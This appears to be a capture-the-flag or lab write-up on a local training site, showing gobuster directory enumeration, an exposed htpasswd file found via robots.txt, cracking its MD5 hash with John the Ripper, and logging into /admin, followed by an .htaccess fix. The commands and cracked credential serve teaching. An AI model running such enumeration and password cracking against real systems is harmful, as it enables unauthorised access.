## [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)

A common tool for file enumeration is called [gobuster](https://github.com/OJ/gobuster). It allows to find URLs on a website that are not accessible through hyperlinks:

```console
$ gobuster dir -u http://localhost:8080/ -w KaliLists/dirb/big.txt --exclude-length 975
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                KaliLists/dirb/big.txt
[+] Negative Status codes:   404
[+] Exclude Length:          975
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 193] [--> http://localhost/admin/]
/audio                (Status: 301) [Size: 193] [--> http://localhost/audio/]
/css                  (Status: 301) [Size: 193] [--> http://localhost/css/]
/errors               (Status: 301) [Size: 193] [--> http://localhost/errors/]
/favicon.ico          (Status: 200) [Size: 1406]
/fonts                (Status: 301) [Size: 193] [--> http://localhost/fonts/]
/images               (Status: 301) [Size: 193] [--> http://localhost/images/]
/includes             (Status: 301) [Size: 193] [--> http://localhost/includes/]
/js                   (Status: 301) [Size: 193] [--> http://localhost/js/]
/robots.txt           (Status: 200) [Size: 53]
/whatever             (Status: 301) [Size: 193] [--> http://localhost/whatever/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

Several files and folders are of interest here since we didn't find them by clicking through the website: `/admin`, `/robots.txt` and `/whatever`.

The `robots.txt` file has the following content:

```
User-agent: *
Disallow: /whatever
Disallow: /.hidden # used for another vulnerability
```

Inside `/whatever`, there is a file `htpasswd`, a common filename for basic authentification in Apache, with what appears to be admin credentials: `root:437394baff5aa33daa618be47b75cb49`.

The [dcode cipher identifier](https://www.dcode.fr/cipher-identifier) shows that the value is likely MD5, but its [MD5 decoder](https://www.dcode.fr/md5-hash) fails to decode the value.

We use a stronger MD5 decoder, [John the Ripper](https://www.openwall.com/john/), which finds the correct password:

```console
john --format=Raw-MD5 security_misconfiguration/resources/htpasswd
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=20
Proceeding with single, rules:Single
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2025-05-23 17:25) 0g/s 49250p/s 49250c/s 49250C/s Root1909..Root1900
Proceeding with wordlist:/tmp/tmprw0oww41/password.lst
Enabling duplicate candidate password suppressor
qwerty123@       (root)
1g 0:00:00:00 DONE 2/3 (2025-05-23 17:25) 7.142g/s 3720Kp/s 3720Kc/s 3720KC/s tanya74..Miracles
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

We login with `root` and `qwerty123@` on `/admin` and get the flag.

Once again, `robots.txt` is not a security measure. The `htpasswd` file shouldn't be readable by a user who knows or finds its URL.

In Apache, the `htpasswd` file is generally protected with a `.htaccess` file with content similar to this:

```
ErrorDocument 401 "Authorisation Required"
AuthType Basic
AuthUserFile /path/to/.htpasswd
Require user username
Satisfy All
```
